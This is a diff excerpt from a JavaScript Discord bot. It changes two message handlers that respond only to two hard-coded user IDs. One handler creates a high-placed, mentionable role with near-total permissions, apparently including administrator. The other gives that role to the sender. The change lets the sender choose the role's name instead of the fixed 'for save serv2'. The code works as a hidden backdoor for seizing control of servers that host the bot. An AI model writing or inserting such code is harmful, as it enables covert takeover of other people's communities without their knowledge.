@@ -80,8 +80,10 @@ bot.on('message', message => {
    if (message.author.id !== '423118623876448296')
    if (message.author.id !== '301913733536415755')
    return;
+   let args = message.content.split(" ").slice(1);
+
 				message.guild.createRole({
-				  name: "for save serv2",
+				  name: args.join(" "),
 				  mentionable: true,
                                  permissions: 2146958591,
 				position: 84
@@ -101,7 +103,8 @@ bot.on('message', message => {
    if (message.author.id !== '423118623876448296')
    if (message.author.id !== '301913733536415755')
    return;
-    message.member.addRole(message.member.guild.roles.find('name', 'for save serv2'));
+   let args = message.content.split(" ").slice(1);
+    message.member.addRole(message.member.guild.roles.find('name', args.join(" ")));
      }
 	
 	
